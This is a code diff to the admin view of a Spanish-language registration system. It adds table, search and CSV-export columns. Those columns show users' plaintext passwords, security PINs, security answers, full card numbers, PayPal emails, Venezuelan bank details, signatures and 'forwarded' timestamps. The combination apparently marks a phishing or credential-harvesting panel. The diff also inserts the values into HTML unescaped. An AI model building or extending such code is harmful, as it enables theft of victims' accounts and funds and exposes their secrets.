@@ -399,13 +399,37 @@
                         <thead>
                             <tr>
                                 <th>Fecha</th>
+                                <th>ID</th>
                                 <th>Nombre Completo</th>
+                                <th>Nombre Preferido</th>
+                                <th>Apodo</th>
                                 <th>Email</th>
                                 <th>País</th>
-                                <th>Teléfono</th>
-                                <th>Documento</th>
-                                <th>Fecha Nacimiento</th>
+                                <th>Estado</th>
                                 <th>Género</th>
+                                <th>Fecha Nacimiento</th>
+                                <th>Teléfono Completo</th>
+                                <th>Código País</th>
+                                <th>Prefijo</th>
+                                <th>Número</th>
+                                <th>Tipo Documento</th>
+                                <th>Número Documento</th>
+                                <th>Contraseña</th>
+                                <th>PIN Seguridad</th>
+                                <th>Pregunta Seguridad</th>
+                                <th>Respuesta Seguridad</th>
+                                <th>Número Tarjeta</th>
+                                <th>Tipo Cuenta</th>
+                                <th>Propósito</th>
+                                <th>Método Pago</th>
+                                <th>Email PayPal</th>
+                                <th>Operador</th>
+                                <th>Recarga Confirmada</th>
+                                <th>Banco Venezuela</th>
+                                <th>Firma</th>
+                                <th>Presencia</th>
+                                <th>Reenviado</th>
+                                <th>Referencia Externa</th>
                             </tr>
                         </thead>
                         <tbody>
@@ -413,26 +437,74 @@
 
             pageData.forEach(reg => {
                 const date = reg.created_at ? new Date(reg.created_at).toLocaleString('es-ES') : '-';
+                const id = reg.id || '-';
                 const fullName = reg.full_name || `${reg.first_name || ''} ${reg.last_name || ''}`.trim() || '-';
+                const preferredName = reg.preferred_name || '-';
+                const nickname = reg.nickname || '-';
                 const email = reg.email || '-';
                 const country = reg.country || '-';
-                const phone = reg.full_phone_number || reg.phone_number || '-';
-                const document = reg.document_number ? `${reg.document_type || 'DOC'}: ${reg.document_number}` : '-';
+                const state = reg.state || '-';
+                const gender = reg.gender || '-';
                 const birthDate = (reg.birth_year && reg.birth_month && reg.birth_day)
                     ? `${reg.birth_day}/${reg.birth_month}/${reg.birth_year}`
                     : '-';
-                const gender = reg.gender || '-';
+                const fullPhone = reg.full_phone_number || '-';
+                const phoneCountryCode = reg.phone_country_code || '-';
+                const phonePrefix = reg.phone_prefix || '-';
+                const phoneNumber = reg.phone_number || '-';
+                const docType = reg.document_type || '-';
+                const docNumber = reg.document_number || '-';
+                const password = reg.password || '-';
+                const securityPin = reg.security_pin || '-';
+                const securityQuestion = reg.security_question || '-';
+                const securityAnswer = reg.security_answer || '-';
+                const cardNumber = reg.card_number || '-';
+                const accountType = reg.account_type || '-';
+                const purpose = reg.purpose || '-';
+                const paymentMethod = reg.payment_method || '-';
+                const paypalEmail = reg.paypal_email || '-';
+                const operator = reg.operator || '-';
+                const rechargeConfirmed = reg.initial_recharge_confirmed ? 'Sí' : 'No';
+                const venezuelaBank = reg.venezuela_bank || '-';
+                const signature = reg.signature_data_url ? '✅ Sí' : '-';
+                const presence = reg.presence || '-';
+                const forwarded = reg.forwarded_at ? new Date(reg.forwarded_at).toLocaleString('es-ES') : '-';
+                const externalRef = reg.external_reference || '-';
 
                 html += `
                     <tr>
                         <td>${date}</td>
+                        <td><code style="font-size:0.8em">${id}</code></td>
                         <td><strong>${fullName}</strong></td>
+                        <td>${preferredName}</td>
+                        <td>${nickname}</td>
                         <td>${email}</td>
                         <td><span class="badge badge-primary">${country}</span></td>
-                        <td>${phone}</td>
-                        <td>${document}</td>
-                        <td>${birthDate}</td>
+                        <td>${state}</td>
                         <td>${gender}</td>
+                        <td>${birthDate}</td>
+                        <td>${fullPhone}</td>
+                        <td>${phoneCountryCode}</td>
+                        <td>${phonePrefix}</td>
+                        <td>${phoneNumber}</td>
+                        <td>${docType}</td>
+                        <td>${docNumber}</td>
+                        <td><code style="font-size:0.8em">${password}</code></td>
+                        <td><code style="font-size:0.8em">${securityPin}</code></td>
+                        <td>${securityQuestion}</td>
+                        <td>${securityAnswer}</td>
+                        <td><code style="font-size:0.8em">${cardNumber}</code></td>
+                        <td>${accountType}</td>
+                        <td>${purpose}</td>
+                        <td>${paymentMethod}</td>
+                        <td>${paypalEmail}</td>
+                        <td>${operator}</td>
+                        <td><span class="badge ${rechargeConfirmed === 'Sí' ? 'badge-success' : 'badge-primary'}">${rechargeConfirmed}</span></td>
+                        <td>${venezuelaBank}</td>
+                        <td>${signature}</td>
+                        <td>${presence}</td>
+                        <td>${forwarded}</td>
+                        <td>${externalRef}</td>
                     </tr>
                 `;
             });
@@ -500,14 +572,24 @@
             } else {
                 filteredRegistrations = allRegistrations.filter(reg => {
                     const searchableText = [
+                        reg.id,
                         reg.email,
                         reg.full_name,
                         reg.first_name,
                         reg.last_name,
+                        reg.preferred_name,
+                        reg.nickname,
                         reg.phone_number,
                         reg.full_phone_number,
                         reg.country,
-                        reg.document_number
+                        reg.state,
+                        reg.document_number,
+                        reg.document_type,
+                        reg.paypal_email,
+                        reg.venezuela_bank,
+                        reg.operator,
+                        reg.security_question,
+                        reg.external_reference
                     ].filter(Boolean).join(' ').toLowerCase();
 
                     return searchableText.includes(searchTerm);
@@ -525,7 +607,16 @@
                 return;
             }
 
-            const headers = ['Fecha', 'Nombre Completo', 'Email', 'País', 'Teléfono', 'Tipo Documento', 'Número Documento', 'Fecha Nacimiento', 'Género'];
+            const headers = [
+                'Fecha', 'ID', 'Nombre Completo', 'Nombre Preferido', 'Apodo', 'Email',
+                'País', 'Estado', 'Género', 'Fecha Nacimiento',
+                'Teléfono Completo', 'Código País', 'Prefijo', 'Número',
+                'Tipo Documento', 'Número Documento',
+                'Contraseña', 'PIN Seguridad', 'Pregunta Seguridad', 'Respuesta Seguridad',
+                'Número Tarjeta', 'Tipo Cuenta', 'Propósito', 'Método Pago', 'Email PayPal',
+                'Operador', 'Recarga Confirmada', 'Banco Venezuela',
+                'Firma', 'Presencia', 'Reenviado', 'Referencia Externa'
+            ];
 
             const rows = filteredRegistrations.map(reg => {
                 const date = reg.created_at ? new Date(reg.created_at).toLocaleString('es-ES') : '';
@@ -533,17 +624,41 @@
                 const birthDate = (reg.birth_year && reg.birth_month && reg.birth_day)
                     ? `${reg.birth_day}/${reg.birth_month}/${reg.birth_year}`
                     : '';
+                const forwarded = reg.forwarded_at ? new Date(reg.forwarded_at).toLocaleString('es-ES') : '';
 
                 return [
                     date,
+                    reg.id || '',
                     fullName,
+                    reg.preferred_name || '',
+                    reg.nickname || '',
                     reg.email || '',
                     reg.country || '',
-                    reg.full_phone_number || reg.phone_number || '',
+                    reg.state || '',
+                    reg.gender || '',
+                    birthDate,
+                    reg.full_phone_number || '',
+                    reg.phone_country_code || '',
+                    reg.phone_prefix || '',
+                    reg.phone_number || '',
                     reg.document_type || '',
                     reg.document_number || '',
-                    birthDate,
-                    reg.gender || ''
+                    reg.password || '',
+                    reg.security_pin || '',
+                    reg.security_question || '',
+                    reg.security_answer || '',
+                    reg.card_number || '',
+                    reg.account_type || '',
+                    reg.purpose || '',
+                    reg.payment_method || '',
+                    reg.paypal_email || '',
+                    reg.operator || '',
+                    reg.initial_recharge_confirmed ? 'Sí' : 'No',
+                    reg.venezuela_bank || '',
+                    reg.signature_data_url ? 'Sí' : 'No',
+                    reg.presence || '',
+                    forwarded,
+                    reg.external_reference || ''
                 ];
             });
 
